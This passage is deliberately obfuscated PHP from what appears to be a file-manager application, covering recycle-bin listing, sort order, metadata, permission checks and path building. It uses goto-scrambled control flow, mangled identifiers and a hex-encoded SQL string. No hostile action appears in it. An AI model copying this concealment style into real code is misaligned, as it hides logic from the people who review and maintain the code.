=& $_SERVER[¢à]; $cùñô—óÛƒ = Model($c‰êòºÌµ¢[389])->listData(); $DäôŒóƒó™ = array_filter_by_field($cùñô—óÛƒ, $c‰êòºÌµ¢[390], $a‰™çÇó»ê); goto Fñ«Ìîªš³; bŠåæÏƒÄ‘: } public function listUserRecycle() { $cÅ…‰æ›œõ =& $_SERVER[¢à]; $Dçïƒ÷‰› = Model($cÅ…‰æ›œõ[391])->listData(); if (!$Dçïƒ÷‰›) { return array(); } $dÓ¦Ùê§â = array($cÅ…‰æ›œõ[380] => array($cÅ…‰æ›œõ[381], $Dçïƒ÷‰›), $cÅ…‰æ›œõ[392] => 1); return $this->listSource($dÓ¦Ùê§â); } public function listSource($BŒŸ¿Ñˆ³, $B÷˜Šêª®¬ = 3000) { goto F½¼‚ïÚ‰·; dÑ‘î²”õ‡: return $DÔ“à°ò…º; goto a„ò¸– æ; F½¼‚ïÚ‰·: $CöéùÂ =& $_SERVER[¢à]; if (!isset($BŒŸ¿Ñˆ³[$CöéùÂ[393]])) { $BŒŸ¿Ñˆ³[$CöéùÂ[393]] = 0; } $E´ìŒàÖô´ = $CöéùÂ[394]; goto e‘ò„Îë·Ÿ; e‘ò„Îë·Ÿ: $DÔ“à°ò…º = $this->field($E´ìŒàÖô´)->_makeOrder()->where($BŒŸ¿Ñˆ³)->selectPage($B÷˜Šêª®¬); $this->_listDataApply($DÔ“à°ò…º[$CöéùÂ[351]]); $this->_listMake($DÔ“à°ò…º); goto dÑ‘î²”õ‡; a„ò¸– æ: } protected function _makeOrder() { goto eÍˆÛŞ¶¿; bÛÉæ³Ú‘À: $BÅà¬‹¿›˜ = array($fÖéî¬çóí[398] => $fÖéî¬çóí[399], $fÖéî¬çóí[400] => $fÖéî¬çóí[401]); $A§âÜÕß¯ë = array($fÖéî¬çóí[28] => $fÖéî¬çóí[28], $fÖéî¬çóí[77] => $fÖéî¬çóí[77], $fÖéî¬çóí[157] => $fÖéî¬çóí[369], $fÖéî¬çóí[375] => $fÖéî¬çóí[375], $fÖéî¬çóí[402] => $fÖéî¬çóí[376], $fÖéî¬çóí[184] => $fÖéî¬çóí[184], $fÖéî¬çóí[107] => $fÖéî¬çóí[107]); $a¼‹í¨ã¸ = Input::get($fÖéî¬çóí[403], $fÖéî¬çóí[7], $a¶ê©˜Œå, array_keys($A§âÜÕß¯ë)); goto bÃ¤Š•íÌ; bÃ¤Š•íÌ: $bÖìÆ™ªõ© = Input::get($fÖéî¬çóí[404], $fÖéî¬çóí[7], $cé ¥…ÛÁ, array_keys($BÅà¬‹¿›˜)); if (!in_array($a¼‹í¨ã¸, array_keys($A§âÜÕß¯ë))) { $a¼‹í¨ã¸ = $fÖéî¬çóí[28]; } if (!in_array($bÖìÆ™ªõ©, array_keys($BÅà¬‹¿›˜))) { $a¼‹í¨ã¸ = $fÖéî¬çóí[398]; } goto B©³‘èÊÁ; eÍˆÛŞ¶¿: $fÖéî¬çóí =& $_SERVER[¢à]; $a¶ê©˜Œå = Model($fÖéî¬çóí[395])->get($fÖéî¬çóí[396]); $cé ¥…ÛÁ = Model($fÖéî¬çóí[395])->get($fÖéî¬çóí[397]); goto bÛÉæ³Ú‘À; B©³‘èÊÁ: if ($a¼‹í¨ã¸ == $fÖéî¬çóí[28]) { } $aˆƒ¦òÎ¼õ = $fÖéî¬çóí[405] . $A§âÜÕß¯ë[$a¼‹í¨ã¸] . $fÖéî¬çóí[50] . $BÅà¬‹¿›˜[$bÖìÆ™ªõ©]; return $this->order(rtrim(trim($aˆƒ¦òÎ¼õ), $fÖéî¬çóí[47])); goto Dİ©ŒÁ‡ˆ; Dİ©ŒÁ‡ˆ: } protected function _listDataApplyItem($EƒæÂ°…‹“, $B´²‡Ûíİ = false) { $BÀß†¯Õ·à = array($EƒæÂ°…‹“); $this->_listDataApply($BÀß†¯Õ·à, $B´²‡Ûíİ); return $BÀß†¯Õ·à[0]; } protected function _listDataApply(&$a…Š®¢Êô˜, $d¶´Ü…¿Ø² = false) { goto d³Ç·¸Ÿµœ; DÛƒÌé“ò: $this->_listAppendPath($a…Š®¢Êô˜); $this->_listAppendAuth($a…Š®¢Êô˜); $this->_listAppendSourceInfo($a…Š®¢Êô˜, $a˜ˆÒÕ¦îÓ); goto Eì ‘±­Ëâ; Eì ‘±­Ëâ: $this->_listAppendUser($a…Š®¢Êô˜); $this->_listFilterInfo($a…Š®¢Êô˜, $d¶´Ü…¿Ø²); goto fâÂã¿¨¸‘; aÈ©µ±…§: $a˜ˆÒÕ¦îÓ = array_unique($a˜ˆÒÕ¦îÓ); $this->_listSourceCache($a…Š®¢Êô˜); if (!$d¶´Ü…¿Ø²) { $this->_listAppendMeta($a…Š®¢Êô˜, $a˜ˆÒÕ¦îÓ); $this->_listAppendFileMeta($a…Š®¢Êô˜, $a˜ˆÒÕ¦îÓ); $this->_listAppendChildren($a…Š®¢Êô˜, $a˜ˆÒÕ¦îÓ); } goto DÛƒÌé“ò; d³Ç·¸Ÿµœ: $f°ª¥çéé =& $_SERVER[¢à]; if (!$a…Š®¢Êô˜) { $a…Š®¢Êô˜ = array(); return; } $a˜ˆÒÕ¦îÓ = array_to_keyvalue($a…Š®¢Êô˜, $f°ª¥çéé[33], $f°ª¥çéé[366]); goto aÈ©µ±…§; fâÂã¿¨¸‘: } protected function _listSourceCache($CÛ“ÉÎãÄ³) { $bò„¨®» =& $_SERVER[¢à]; foreach ($CÛ“ÉÎãÄ³ as $Fíó«±Ş’Ü) { self::$cacheSourceInfo[$bò„¨®»[406] . $Fíó«±Ş’Ü[$bò„¨®»[366]]] = $Fíó«±Ş’Ü; } } protected function _listFilterInfo(&$D´’ÒÂ–Ì‡, $cÈ­òò…Òƒ = false) { $A£…ùÜ«èì =& $_SERVER[¢à]; foreach ($D´’ÒÂ–Ì‡ as &$B‚£Û¤¶È) { $B‚£Û¤¶È = $this->pathInfoFilter($B‚£Û¤¶È); self::$cachePathInfo[$A£…ùÜ«èì[407] . intval($cÈ­òò…Òƒ) . $A£…ùÜ«èì[408] . $B‚£Û¤¶È[$A£…ùÜ«èì[366]]] = $B‚£Û¤¶È; } } protected function _listMake(&$f¢‹–á“É‹) { $dË´Àšßëø =& $_SERVER[¢à]; $f¢‹–á“É‹[$dË´Àšßëø[74]] = array(); $f¢‹–á“É‹[$dË´Àšßëø[73]] = array(); foreach ($f¢‹–á“É‹[$dË´Àšßëø[351]] as $F„¸ç‰‡æ) { $D²Èˆ¼¿© = $F„¸ç‰‡æ[$dË´Àšßëø[367]] == 1 ? $dË´Àšßëø[74] : $dË´Àšßëø[73]; $f¢‹–á“É‹[$D²Èˆ¼¿©][] = $F„¸ç‰‡æ; } unset($f¢‹–á“É‹[$dË´Àšßëø[351]]); } protected function _listAppendMeta(&$A·Ï˜ÒìÅ„, $AóïŒ–õ®º) { goto b£¦ƒîÛ‰; f×ö“ŸÚ: foreach ($bÙ­âÊİ¼Ã as $DÀ†„äËê…) { if (!isset($BÔõŒäÌŒ¢[$DÀ†„äËê…[$EÜ‰»è¹Š[366]]])) { $BÔõŒäÌŒ¢[$DÀ†„äËê…[$EÜ‰»è¹Š[366]]] = array(); } if (in_array($DÀ†„äËê…[$EÜ‰»è¹Š[89]], $B×ñíÈ”ºø)) { continue; } $BÔõŒäÌŒ¢[$DÀ†„äËê…[$EÜ‰»è¹Š[366]]][$DÀ†„äËê…[$EÜ‰»è¹Š[89]]] = $DÀ†„äËê…[$EÜ‰»è¹Š[356]]; } foreach ($A·Ï˜ÒìÅ„ as &$a—èİ÷º™) { $a—èİ÷º™[$EÜ‰»è¹Š[413]] = !1; if (isset($BÔõŒäÌŒ¢[$a—èİ÷º™[$EÜ‰»è¹Š[366]]])) { $a—èİ÷º™[$EÜ‰»è¹Š[413]] = $BÔõŒäÌŒ¢[$a—èİ÷º™[$EÜ‰»è¹Š[366]]]; } if ($this->fileIsLock($a—èİ÷º™) && $a—èİ÷º™[$EÜ‰»è¹Š[373]]) { $D¹Ôˆ„• = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $a—èİ÷º™[$EÜ‰»è¹Š[373]][$EÜ‰»è¹Š[374]] = AuthModel::authDisable($a—èİ÷º™[$EÜ‰»è¹Š[373]][$EÜ‰»è¹Š[374]], $D¹Ôˆ„•); $a—èİ÷º™[$EÜ‰»è¹Š[373]][$EÜ‰»è¹Š[414]][$EÜ‰»è¹Š[373]] = $a—èİ÷º™[$EÜ‰»è¹Š[373]][$EÜ‰»è¹Š[374]]; } } goto Aì†©––; b£¦ƒîÛ‰: $EÜ‰»è¹Š =& $_SERVER[¢à]; $A¹ªäá¾„ = array($EÜ‰»è¹Š[380] => array($EÜ‰»è¹Š[381], $AóïŒ–õ®º)); $bÙ­âÊİ¼Ã = Model($EÜ‰»è¹Š[409])->field($EÜ‰»è¹Š[410])->where($A¹ªäá¾„)->select(); goto aÈî¢‚§í¿; aÈî¢‚§í¿: if (!$bÙ­âÊİ¼Ã) { return; } $B×ñíÈ”ºø = array($EÜ‰»è¹Š[411], $EÜ‰»è¹Š[412]); $BÔõŒäÌŒ¢ = array(); goto f×ö“ŸÚ; Aì†©––: } protected function _listAppendFileMeta(&$aë­µ±Ğß, $bÄ¾»øÉÆè) { goto c‚¸Ñ¶¡ğ; c‚¸Ñ¶¡ğ: $Fíƒğ‹½¡¸ =& $_SERVER[¢à]; $Fêİ¸ÕÓ—â = array_to_keyvalue($aë­µ±Ğß, $Fíƒğ‹½¡¸[33], $Fíƒğ‹½¡¸[415]); $Fêİ¸ÕÓ—â = array_filter(array_unique($Fêİ¸ÕÓ—â)); goto cÜ„Œ£ìâ¬; cÜ„Œ£ìâ¬: if (!$Fêİ¸ÕÓ—â) { return; } $aÕ‹È«´ƒ“ = array($Fíƒğ‹½¡¸[416] => array($Fíƒğ‹½¡¸[381], $Fêİ¸ÕÓ—â)); $C“½¹Éóô = $Fíƒğ‹½¡¸[417]; goto AØ™ÛøÅä; d‚®Î±ëÀÏ: $fô­İ‘®Šö = $fô­İ‘®Šö ? $fô­İ‘®Šö : array(); $F·š•„Å£Ü = array(); foreach ($fô­İ‘®Šö as $B³ê®ñÇî) { if (!isset($F·š•„Å£Ü[$B³ê®ñÇî[$Fíƒğ‹½¡¸[415]]])) { $F·š•„Å£Ü[$B³ê®ñÇî[$Fíƒğ‹½¡¸[415]]] = array(); } $F·š•„Å£Ü[$B³ê®ñÇî[$Fíƒğ‹½¡¸[415]]][$B³ê®ñÇî[$Fíƒğ‹½¡¸[89]]] = $B³ê®ñÇî[$Fíƒğ‹½¡¸[356]]; } goto e¼–ù³ŒÌ; e¼–ù³ŒÌ: foreach ($aë­µ±Ğß as &$F„››Öö¬‹) { goto có«‡³õ‘‹; có«‡³õ‘‹: $Dëğ·‹Šó = $F„››Öö¬‹[$Fíƒğ‹½¡¸[415]]; if (!$Dëğ·‹Šó || !isset($bíî÷§Í¹§[$Dëğ·‹Šó])) { continue; } $e³‚»îÙ’Ë = $bíî÷§Í¹§[$Dëğ·‹Šó]; goto b…¡·¸ğéë; b…¡·¸ğéë: $e³‚»îÙ’Ë[$Fíƒğ‹½¡¸[77]] = $F„››Öö¬‹[$Fíƒğ‹½¡¸[77]]; $e³‚»îÙ’Ë[$Fíƒğ‹½¡¸[28]] = $F„››Öö¬‹[$Fíƒğ‹½¡¸[28]]; self::$cacheFileInfo[$Fíƒğ‹½¡¸[421] . $Dëğ·‹Šó] = $e³‚»îÙ’Ë; goto B×¯ó¯†; B×¯ó¯†: unset($bíî÷§Í¹§[$Dëğ·‹Šó][$Fíƒğ‹½¡¸[75]]); $BßŸ–òÃÆ = is_array($F·š•„Å£Ü[$Dëğ·‹Šó]) ? $F·š•„Å£Ü[$Dëğ·‹Šó] : array(); $F„››Öö¬‹[$Fíƒğ‹½¡¸[159]] = array_merge($BßŸ–òÃÆ, $bíî÷§Í¹§[$Dëğ·‹Šó]); goto CñëÇÈ‹¦¨; CñëÇÈ‹¦¨: if (isset($F„››Öö¬‹[$Fíƒğ‹½¡¸[159]][$Fíƒğ‹½¡¸[422]])) { $F„››Öö¬‹[$Fíƒğ‹½¡¸[422]] = json_decode($F„››Öö¬‹[$Fíƒğ‹½¡¸[159]][$Fíƒğ‹½¡¸[422]], !0); unset($F„››Öö¬‹[$Fíƒğ‹½¡¸[159]][$Fíƒğ‹½¡¸[422]]); } goto B‡ÙßÈ¶ğÜ; B‡ÙßÈ¶ğÜ: } goto d‰Êƒ‰†òó; AØ™ÛøÅä: $bíî÷§Í¹§ = Model($Fíƒğ‹½¡¸[418])->field($C“½¹Éóô)->where($aÕ‹È«´ƒ“)->select(); $bíî÷§Í¹§ = array_to_keyvalue($bíî÷§Í¹§, $Fíƒğ‹½¡¸[415]); $fô­İ‘®Šö = Model($Fíƒğ‹½¡¸[419])->field($Fíƒğ‹½¡¸[420])->where($aÕ‹È«´ƒ“)->select(); goto d‚®Î±ëÀÏ; d‰Êƒ‰†òó: } protected function _listAppendSourceInfo(&$C¨É½õŒ¿, $d±àè–¤) { goto D¶ëÕùõ ; C…¾Í Ø‡«: $F´¼ë¼¤Ã¼ = Model($d‘©…Æõ¦è[389])->listData(); $déëÛ‰‰ê = Model($d‘©…Æõ¦è[378])->listData(); $F‚Ù–·ìÖÀ = Model($d‘©…Æõ¦è[425])->listSimple(); goto EÎÁññ»ó…; D¶ëÕùõ : $d‘©…Æõ¦è =& $_SERVER[¢à]; if (!defined($d‘©…Æõ¦è[423])) { return; } $E¦ìµº³ªÀ = Model($d‘©…Æõ¦è[424])->listData(); goto C…¾Í Ø‡«; EÎÁññ»ó…: $eáÛ¯ÆÛ‘ = array_to_keyvalue($E¦ìµº³ªÀ, $d‘©…Æõ¦è[364]); $Cæ–·×ÚÀ‰ = array_to_keyvalue_group($F´¼ë¼¤Ã¼, $d‘©…Æõ¦è[75], $d‘©…Æõ¦è[390]); $d‘‚·´¶½Š = array_to_keyvalue($déëÛ‰‰ê, $d‘©…Æõ¦è[75]); goto EÌ‚Ü…ƒ¬; EÌ‚Ü…ƒ¬: $b‚šÂê‰ ù = array_to_keyvalue_group($F‚Ù–·ìÖÀ, $d‘©…Æõ¦è[366]); foreach ($C¨É½õŒ¿ as &$fà³ìÏÃ¥š) { $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]] = array($d‘©…Æõ¦è[426] => 0, $d‘©…Æõ¦è[427] => 0, $d‘©…Æõ¦è[428] => 0); if (isset($d‘‚·´¶½Š[$fà³ìÏÃ¥š[$d‘©…Æõ¦è[366]]])) { $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]][$d‘©…Æõ¦è[429]] = 1; $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]][$d‘©…Æõ¦è[430]] = $d‘‚·´¶½Š[$fà³ìÏÃ¥š[$d‘©…Æõ¦è[366]]][$d‘©…Æõ¦è[28]]; } if (isset($Cæ–·×ÚÀ‰[$fà³ìÏÃ¥š[$d‘©…Æõ¦è[366]]])) { $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]][$d‘©…Æõ¦è[431]] = array(); foreach ($Cæ–·×ÚÀ‰[$fà³ìÏÃ¥š[$d‘©…Æõ¦è[366]]] as $bñÈšÎßÌ) { $b‚•©„÷·â = $eáÛ¯ÆÛ‘[$bñÈšÎßÌ]; $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]][$d‘©…Æõ¦è[431]][] = array($d‘©…Æõ¦è[432] => $b‚•©„÷·â[$d‘©…Æõ¦è[364]], $d‘©…Æõ¦è[383] => $b‚•©„÷·â[$d‘©…Æõ¦è[28]], $d‘©…Æõ¦è[433] => $b‚•©„÷·â[$d‘©…Æõ¦è[434]]); } } if (isset($b‚šÂê‰ ù[$fà³ìÏÃ¥š[$d‘©…Æõ¦è[366]]])) { $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]][$d‘©…Æõ¦è[435]] = array(); foreach ($b‚šÂê‰ ù[$fà³ìÏÃ¥š[$d‘©…Æõ¦è[366]]] as $AŸ›ÍÆÊ¼Ï) { $fà³ìÏÃ¥š[$d‘©…Æõ¦è[388]][$d‘©…Æõ¦è[435]] = array($d‘©…Æõ¦è[436] => $AŸ›ÍÆÊ¼Ï[$d‘©…Æõ¦è[437]], $d‘©…Æõ¦è[438] => $AŸ›ÍÆÊ¼Ï[$d‘©…Æõ¦è[439]], $d‘©…Æõ¦è[440] => $AŸ›ÍÆÊ¼Ï[$d‘©…Æõ¦è[366]], $d‘©…Æõ¦è[441] => $AŸ›ÍÆÊ¼Ï[$d‘©…Æõ¦è[442]], $d‘©…Æõ¦è[443] => $AŸ›ÍÆÊ¼Ï[$d‘©…Æõ¦è[444]]); } } } return $C¨É½õŒ¿; goto eí›Å—¸åË; eí›Å—¸åË: } protected function _listAppendChildren(&$AÅîÄİ‹¤¦, $CİÄÉ•¥†²) { goto fâÒÚ£ª¨ƒ; CÕ¤Âë»‹: foreach ($AÅîÄİ‹¤¦ as &$cÂ«åÊÎ‡ñ) { if ($cÂ«åÊÎ‡ñ[$D½§¤¬ƒÏù[367]]) { unset($cÂ«åÊÎ‡ñ[$D½§¤¬ƒÏù[369]]); $cÂ«åÊÎ‡ñ[$D½§¤¬ƒÏù[189]] = intval($CÏë’Ã‘ØÄ[$cÂ«åÊÎ‡ñ[$D½§¤¬ƒÏù[366]] . $D½§¤¬ƒÏù[447]][$D½§¤¬ƒÏù[448]]); $cÂ«åÊÎ‡ñ[$D½§¤¬ƒÏù[188]] = intval($CÏë’Ã‘ØÄ[$cÂ«åÊÎ‡ñ[$D½§¤¬ƒÏù[366]] . $D½§¤¬ƒÏù[449]][$D½§¤¬ƒÏù[448]]); } } goto eÚ‘‰È÷·¥; fâÒÚ£ª¨ƒ: $D½§¤¬ƒÏù =& $_SERVER[¢à]; $C»çÏÜö›ˆ = $D½§¤¬ƒÏù[358]; $CÏë’Ã‘ØÄ = array(); goto cŸ¤×Ú“ø½; eË—¡‘òÜ: $C¸òí¾ä…Â = $this->tablePrefix . $this->tableName; for ($eÈ§”ŠÛó™ = 0; $eÈ§”ŠÛó™ < $a½áá…ÁØ; $eÈ§”ŠÛó™++) { $fáİÛßÕ = intval($AÅîÄİ‹¤¦[$eÈ§”ŠÛó™][$D½§¤¬ƒÏù[393]]); if ($AÅîÄİ‹¤¦[$eÈ§”ŠÛó™][$D½§¤¬ƒÏù[367]]) { $dµÌ”£ ¸‹ = $AÅîÄİ‹¤¦[$eÈ§”ŠÛó™][$D½§¤¬ƒÏù[366]]; $C»çÏÜö›ˆ .= "\x53\105\114\x45\103\x54\x20\52\x20\106\x52\x4f\115\x20\x28\123\x45\x4c\x45\x43\x54\x20\x27{$dµÌ”£ ¸‹}\137\150\x61\163\x46\151\x6c\145\47\x20\x61\163\40\x68\x61\x73\54\x63\x6f\165\x6e\164\x28\x31\51\x20\x61\x73\x20\150\x61\x73\103\x6f\x75\156\x74\40\106\x52\117\x4d\40\x60{$C¸òí¾ä…Â}\140\40\xa\x9\x9\11\11\11\167\x68\x65\162\145\x20\160\141\162\145\156\164\111\104\x3d{$dµÌ”£ ¸‹}\x20\141\156\144\40\151\x73\106\157\x6c\x64\x65\162\x3d\x30\40\141\x6e\x64\40\x69\163\x44\x65\154\145\164\x65\75{$fáİÛßÕ}\x29\40\x61\163\x20\x74\142\x31\137{$dµÌ”£ ¸‹}\40\165\x6e\151\157\x6e\x20\x61\x6c\154\x20\12\11\x9\11\11\11\123\x45\x4c\x45\103\124\x20\x2a\x20\x46\x52\117\115\40\x28\x53\105\114\105\103\124\40\x27{$dµÌ”£ ¸‹}\x5f\150\141\163\106\x6f\154\144\145\162\47\x20\x61\163\40\x68\x61\x73\x46\x69\x6c\x65\54\143\x6f\165\x6e\164\50\x31\x29\40\x61\163\40\x68\141\x73\103\x6f\165\x6e\x74\x20\106\x52\x4f\x4d\x20\140{$C¸òí¾ä…Â}\x60\40\12\x9\11\11\x9\x9\x77\x68\145\162\145\x20\x70\141\162\x65\x6e\164\x49\x44\75{$dµÌ”£ ¸‹}\x20\x61\156\144\x20\x69\163\106\x6f\x6c\144\145\x72\75\61\40\141\156\x64\x20\x69\163\104\x65\154\x65\164\x65\75{$fáİÛßÕ}\51\40\141\163\x20\164\142\62\137{$dµÌ”£ ¸‹}\x20\165\156\x69\157\156\40\141\x6c\x6c\40"; } if ((strlen($C»çÏÜö›ˆ) >= $eÌ‹Á“¤‘ || $eÈ§”ŠÛó™ == $a½áá…ÁØ - 1) && $C»çÏÜö›ˆ) { $C»çÏÜö›ˆ = substr($C»çÏÜö›ˆ, 0, -strlen($D½§¤¬ƒÏù[445])); $EÔ´ˆåõª£ = $this->query($C»çÏÜö›ˆ); $CÏë’Ã‘ØÄ = array_merge($CÏë’Ã‘ØÄ, $EÔ´ˆåõª£); $C»çÏÜö›ˆ = $D½§¤¬ƒÏù[33]; } } $CÏë’Ã‘ØÄ = array_to_keyvalue($CÏë’Ã‘ØÄ, $D½§¤¬ƒÏù[446]); goto CÕ¤Âë»‹; cŸ¤×Ú“ø½: $eÌ‹Á“¤‘ = 1024 * 50; $AÅîÄİ‹¤¦ = is_array($AÅîÄİ‹¤¦) ? $AÅîÄİ‹¤¦ : array(); $a½áá…ÁØ = count($AÅîÄİ‹¤¦); goto eË—¡‘òÜ; eÚ‘‰È÷·¥: } protected function _listAppendAuth(&$Fñë¬ß‡³Œ) { goto DôÀ‡ÖÀÕº; b—å½¦ˆ¦: $Bğ¤ÊÑöº¦ = Model($d®ÜÏõÊŸÀ[450])->getSourceList($BôÛ»Ï¡Öì, $c ™¤Ø‹ÃÀ); foreach ($Fñë¬ß‡³Œ as $FßĞƒïÔ±î => &$c•·¤Æ›„Š) { $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]] = $Bğ¤ÊÑöº¦[$c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[366]]]; if (!$c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]] && $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[368]] == self::TYPE_GROUP) { $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]] = Action($d®ÜÏõÊŸÀ[451])->pathGroupAuthMake($c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[452]]); if (!$c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]] && !_get($GLOBALS, $d®ÜÏõÊŸÀ[453])) { $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[186]] = !1; $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[185]] = !1; } } if ($c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]]) { $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[186]] = AuthModel::authCheckEdit($c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]][$d®ÜÏõÊŸÀ[374]]); $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[185]] = AuthModel::authCheckView($c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[373]][$d®ÜÏõÊŸÀ[374]]); } $this->groupPathDisplay($c•·¤Æ›„Š); } goto b„¾² òŠµ; bôÙ»¼áò¤: foreach ($Fñë¬ß‡³Œ as $c•·¤Æ›„Š) { if ($c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[368]] == self::TYPE_GROUP) { $BôÛ»Ï¡Öì[] = $c•·¤Æ›„Š[$d®ÜÏõÊŸÀ[366]]; } } if (!$BôÛ»Ï¡Öì) { return; } $c ™¤Ø‹ÃÀ = array_to_keyvalue($Fñë¬ß‡³Œ, $d®ÜÏõÊŸÀ[366]); goto b—å½¦ˆ¦; DôÀ‡ÖÀÕº: $d®ÜÏõÊŸÀ =& $_SERVER[¢à]; if (!defined($d®ÜÏõÊŸÀ[423])) { return; } $BôÛ»Ï¡Öì = array(); goto bôÙ»¼áò¤; b„¾² òŠµ: } public function groupPathDisplay(&$B¬í»ˆÄÂ) { goto A‘¿ã›†¶ì; A‘¿ã›†¶ì: $Bğ­ÉÇ— =& $_SERVER[¢à]; if ($B¬í»ˆÄÂ[$Bğ­ÉÇ—[368]] != self::TYPE_GROUP) { return; } $b ©Š­êÏÄ = Model($Bğ­ÉÇ—[454])->getInfo($B¬í»ˆÄÂ[$Bğ­ÉÇ—[452]]); goto aÈéå£Î‰; aÈéå£Î‰: $BÙ•áß“± = $this->parentLevelArray($b ©Š­êÏÄ[$Bğ­ÉÇ—[455]]); $bœ¼ì²•×õ = $Bğ­ÉÇ—[33]; foreach ($BÙ•áß“± as $Eí…ÕÌ‘«¬) { $f»èŠº°ÉÅ = Model($Bğ­ÉÇ—[454])->getInfo($Eí…ÕÌ‘«¬); $bœ¼ì²•×õ .= $f»èŠº°ÉÅ[$Bğ­ÉÇ—[388]][$Bğ­ÉÇ—[366]] . $Bğ­ÉÇ—[47]; } goto EœÏ¿âª‹Ë; EœÏ¿âª‹Ë: $B¬í»ˆÄÂ[$Bğ­ÉÇ—[456]] = $b ©Š­êÏÄ[$Bğ­ÉÇ—[457]]; $B¬í»ˆÄÂ[$Bğ­ÉÇ—[377]] = $b ©Š­êÏÄ[$Bğ­ÉÇ—[455]]; $B¬í»ˆÄÂ[$Bğ­ÉÇ—[458]] = $b ©Š­êÏÄ[$Bğ­ÉÇ—[459]]; goto a·è†Õó¸»; a·è†Õó¸»: $B¬í»ˆÄÂ[$Bğ­ÉÇ—[460]] = $bœ¼ì²•×õ . $b ©Š­êÏÄ[$Bğ­ÉÇ—[388]][$Bğ­ÉÇ—[366]]; goto cƒíˆä‰ğœ; cƒíˆä‰ğœ: } protected function _listAppendPath(&$AÓ‹èµº¯Ì) { goto EíƒŒî÷¨Ù; aœ¨ï¤Õ¨è: $b’ëµìòåŸ = array(); foreach ($fÓÙ¸•ìß  as $b…¤ôËà­½ => $aßŒ©¾°±”) { if (!$aßŒ©¾°±”) { $b’ëµìòåŸ[] = $b…¤ôËà­½; } } if ($b’ëµìòåŸ) { $E·Øˆ®Áêğ = array($Eß—”õÄ¢ä[380] => array($Eß—”õÄ¢ä[381], $b’ëµìòåŸ)); if (count($b’ëµìòåŸ) == 1) { $Fˆ‘œ¢Ø¢¶ = $this->sourceInfo($b’ëµìòåŸ[0]); $Fˆ‘œ¢Ø¢¶ = is_array($Fˆ‘œ¢Ø¢¶) ? array($Fˆ‘œ¢Ø¢¶) : !1; } else { $Fˆ‘œ¢Ø¢¶ = $this->field($Eß—”õÄ¢ä[461])->where($E·Øˆ®Áêğ)->select(); } $dÎì…òÏ©‹ = array_to_keyvalue($Fˆ‘œ¢Ø¢¶, $Eß—”õÄ¢ä[366], $Eß—”õÄ¢ä[28]); $fÓÙ¸•ìß  = array_merge_index($fÓÙ¸•ìß , $dÎì…òÏ©‹); } goto E†è…‹Ò×œ; EíƒŒî÷¨Ù: $Eß—”õÄ¢ä =& $_SERVER[¢à]; $fÓÙ¸•ìß  = array(); foreach ($AÓ‹èµº¯Ì as &$BÎ¸˜æÀô¶) { $fÓÙ¸•ìß [$BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[366]]] = $BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[28]]; $b™‹ÃŠëù = $this->parentLevelArray($BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[455]]); array_shift($b™‹ÃŠëù); foreach ($b™‹ÃŠëù as $EÃÑ’Ÿïô) { if (!isset($fÓÙ¸•ìß [$EÃÑ’Ÿïô])) { $fÓÙ¸•ìß [$EÃÑ’Ÿïô] = 0; } } } goto aœ¨ï¤Õ¨è; E†è…‹Ò×œ: $FÁšÕ¸š“ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($AÓ‹èµº¯Ì as &$BÎ¸˜æÀô¶) { goto Eù‘ÙÇ¹µ; Eù‘ÙÇ¹µ: $b™‹ÃŠëù = $this->parentLevelArray($BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[455]]); $B»©îÆÒ´ = $this->_listAppendPathRoot($BÎ¸˜æÀô¶, $b™‹ÃŠëù); foreach ($b™‹ÃŠëù as $EÃÑ’Ÿïô) { if (isset($fÓÙ¸•ìß [$EÃÑ’Ÿïô])) { $B»©îÆÒ´ .= $fÓÙ¸•ìß [$EÃÑ’Ÿïô] . $Eß—”õÄ¢ä[8]; } } goto a½ÖÑËÇÅğ; aË¾…ğ°ö: $bßºç¸¥ºË = trim($BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[462]], $Eß—”õÄ¢ä[8]); if ($BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[457]] == $Eß—”õÄ¢ä[464] && $bßºç¸¥ºË) { $BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[28]] = $bßºç¸¥ºË; } $this->_listAppendPathRecycle($BÎ¸˜æÀô¶, $b™‹ÃŠëù, $FÁšÕ¸š“); goto FÔÕ¨“; a½ÖÑËÇÅğ: if ($b™‹ÃŠëù) { $B»©îÆÒ´ .= $BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[28]]; } if ($BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[367]]) { $B»©îÆÒ´ .= $Eß—”õÄ¢ä[8]; } $BÎ¸˜æÀô¶[$Eß—”õÄ¢ä[462]] = str_replace($Eß—”õÄ¢ä[463], $Eß—”õÄ¢ä[8], $B»©îÆÒ´); goto aË¾…ğ°ö; FÔÕ¨“: } goto FİôÍˆ; FİôÍˆ: } private function _listAppendPathRecycle(&$dí„—²¥ƒ‚, $FŒÎÊÂŞŒ, $FœÁ½‰Ø­ï) { goto D»ÊØíö¹; cø·ˆÅƒ÷±: $dí„—²¥ƒ‚[$CÙÂõºÒ–Ë[455]] = $CÙÂõºÒ–Ë[466] . implode($CÙÂõºÒ–Ë[47], array_slice($FŒÎÊÂŞŒ, 1)) 